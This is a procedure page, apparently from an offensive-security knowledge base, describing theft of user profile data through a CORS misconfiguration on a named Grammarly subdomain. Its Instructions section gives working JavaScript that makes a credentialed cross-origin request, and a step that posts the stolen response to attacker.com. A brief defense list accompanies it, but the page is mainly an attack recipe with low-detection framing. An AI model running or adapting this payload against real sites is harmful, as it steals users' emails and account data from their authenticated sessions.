---
id: proc-cors-get-theft
tags:
  - data-theft
  - cors
  - csrf
  - profile-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/javascript-get-profile-data]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.768Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Exploit Public-Facing Application]]'
---
# Cross-Origin-GET-Request-for-Profile-Data-Theft

## Summary

This procedure uses injected JavaScript to perform a cross-origin GET request to the /profile endpoint, exploiting CORS misconfiguration to include credentials and steal user data such as email and subscription preferences without CSRF protection.

## Description

With the origin spoofed and JS injected, the payload sends an XMLHttpRequest to https://g-mail.grammarly.com/profile. The server's response includes Access-Control-Allow-Origin reflecting the spoofed value and allows credentials, returning JSON with sensitive fields. No CSRF token is required, enabling unauthenticated data access in the victim's session context.

## Requirements

1. Prior JS injection and origin spoofing
2. Victim's active session with profileToken cookie
3. Browser supporting XMLHttpRequest with credentials
4. Target CORS policy allowing the spoofed origin

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens for all state-changing and sensitive GET requests
- Restrict CORS to exact HTTPS origins, excluding subdomains and HTTP
- Log and alert on cross-origin requests with credentials
- Implement rate limiting on profile endpoints

## Objectives

1. Retrieve user email and preference data
2. Exfiltrate via document.innerHTML or network
3. Demonstrate session-based data access

## Instructions

### Step 1: Execute GET Request

**Context**: The injected JS triggers the request to fetch profile JSON.

**Command** ([[commands/javascript-get-profile-data]]):

```javascript
var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById("response-node").innerHTML = this.responseText; } }; xhttp.open("GET", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send();
```

> This sends a GET with credentials; server responds with JSON due to CORS allowance.

**Expected Output**: {"id":749327815,"email":"email@yandex.ru","preferenceFields":[{"name":"Weekly Progress Reports","description":"...","order":49,"value":true}],"unsubscribe":false}

### Step 2: Exfiltrate Data

**Context**: Capture and send the response to attacker's server.

**Instructions**: Modify the onreadystatechange to fetch('http://attacker.com/leak', {method: 'POST', body: this.responseText})

**Expected Output**: Data received on attacker's endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/javascript-get-profile-data]]

## Tools Used


## Tags

- data-theft
- cors
- csrf
- profile-leak
